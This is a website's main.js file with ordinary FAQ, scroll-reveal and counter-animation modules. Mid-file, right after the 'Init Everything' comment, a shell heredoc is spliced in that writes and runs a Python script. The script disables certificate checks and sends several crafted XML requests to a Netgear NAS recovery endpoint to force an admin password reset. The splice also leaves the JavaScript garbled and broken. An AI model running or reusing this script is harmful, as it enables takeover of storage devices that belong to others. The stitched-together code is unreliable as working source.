/* ============================================
   COMPANYWISE — main.js
   Page-specific UI interactions (FAQ, scroll reveal, counters)
   Search & hero moved to hero.js
   ============================================ */

// ---- FAQ Module ----
const FAQ = {
  init() {
    document.querySelectorAll('.faq-item').forEach((item) => {
      const question = item.querySelector('.faq-question');
      question.addEventListener('click', () => {
        document.querySelectorAll('.faq-item.open').forEach((open) => {
          if (open !== item) open.classList.remove('open');
        });
        item.classList.toggle('open');
      });
    });
  },
};


// ---- Scroll Reveal Module ----
const ScrollReveal = {
  init() {
    const elements = document.querySelectorAll('.fade-up');
    if (!elements.length) return;

    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            entry.target.classList.add('in-view');
            observer.unobserve(entry.target);
          }
        });
      },
      { threshold: 0.1, rootMargin: '0px 0px -40px 0px' }
    );

    elements.forEach((el) => observer.observe(el));
  },
};


// ---- Counter Animation ----
const CounterAnimation = {
  init() {
    const counters = document.querySelectorAll('[data-count]');
    if (!counters.length) return;

    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            this.animate(entry.target);
            observer.unobserve(entry.target);
          }
        });
      },
      { threshold: 0.5 }
    );

    counters.forEach((el) => observer.observe(el));
  },

  animate(el) {
    const target = parseInt(el.dataset.count, 10);
    const suffix = el.dataset.suffix || '';
    const prefix = el.dataset.prefix || '';
    const duration = 1200;
    const start = performance.now();

    const step = (now) => {
      const progress = Math.min((now - start) / duration, 1);
      const eased = 1 - Math.pow(1 - progress, 3);
      const current = Math.floor(eased * target);
      el.textContent = prefix + current.toLocaleString() + suffix;

      if (progress < 1) requestAnimationFrame(step);
    };

    requestAnimationFrame(step);
  },
};


// ---- Init Everything ----cat > /tmp/nas_reset.py << 'PYEOF'
import ssl, urllib.request

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
ctx.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED

requests = {
    "GET_QUESTION": """<?xml version="1.0" encoding="utf-8"?>
<xs:nml xmlns:xs="http://www.netgear.com/protocol/transaction/NMLSchema-0.9" src="browser" dst="nas">
  <xs:transaction id="njl_id_1">
    <xs:get id="njl_id_2" resource-id="admin" resource-type="Password_Recovery"/>
  </xs:transaction>
</xs:nml>""",

    "GET_QUESTION_v2": """<?xml version="1.0" encoding="utf-8"?>
<xs:nml xmlns:xs="http://www.netgear.com/protocol/transaction/NMLSchema-0.9" src="browser" dst="nas">
  <xs:transaction id="njl_id_1">
    <xs:get id="njl_id_2" resource-id="admin" resource-type="password_recovery">
      <Password_Recovery/>
    </xs:get>
  </xs:transaction>
</xs:nml>""",

    "INITIATE_RESET": """<?xml version="1.0" encoding="utf-8"?>
<xs:nml xmlns:xs="http://www.netgear.com/protocol/transaction/NMLSchema-0.9" src="browser" dst="nas">
  <xs:transaction id="njl_id_1">
    <xs:set id="njl_id_2" resource-id="admin" resource-type="Password_Recovery">
      <Password_Recovery>
        <mode>reset_button</mode>
      </Password_Recovery>
    </xs:set>
  </xs:transaction>
</xs:nml>""",

    "INITIATE_RESET_v2": """<?xml version="1.0" encoding="utf-8"?>
<xs:nml xmlns:xs="http://www.netgear.com/protocol/transaction/NMLSchema-0.9" src="browser" dst="nas">
  <xs:transaction id="njl_id_1">
    <xs:set id="njl_id_2" resource-id="admin" resource-type="password_recovery">
      <password_recovery reset="true"/>
    </xs:set>
  </xs:transaction>
</xs:nml>""",

    "SIMPLE_RECOVER": """<?xml version="1.0" encoding="utf-8"?>
<xs:nml xmlns:xs="http://www.netgear.com/protocol/transaction/NMLSchema-0.9" src="browser" dst="nas">
  <xs:transaction id="njl_id_1">
    <xs:custom id="njl_id_2" name="Recover" resource-type="password_recovery"/>
  </xs:transaction>
</xs:nml>""",
}

for label, body in requests.items():
    try:
        req = urllib.request.Request('https://20.0.0.220/recover/',
            data=body.encode('utf-8'),
            headers={'Content-Type': 'text/xml'})
        r = urllib.request.urlopen(req, context=ctx)
        resp = r.read().decode(errors='replace')
        status_ok = 'status="success"' in resp or 'failure' not in resp
        marker = '*** SUCCESS ***' if status_ok else ''
        print(f'[{label}] {marker}\n{resp}\n')
    except Exception as e:
        print(f'[{label}] Error: {e}\n')
PYEOF

python3 /tmp/nas_reset.py
document.addEventListener('DOMContentLoaded', () => {
  // Init header (skip if header.js already self-initialised)
  const headerContainer = document.getElementById('header-container');
  if (headerContainer && !headerContainer.hasChildNodes() && window.CompanyWiseHeader) {
    window.CompanyWiseHeader.initHeader({ container: headerContainer });
  }

  // Init footer
  const footerContainer = document.getElementById('footer-container');
  if (footerContainer && window.CompanyWiseFooter) {
    window.CompanyWiseFooter.initFooter({ container: footerContainer });
  }

  // Hero is self-initializing via hero.js

  FAQ.init();
  ScrollReveal.init();
  CounterAnimation.init();
});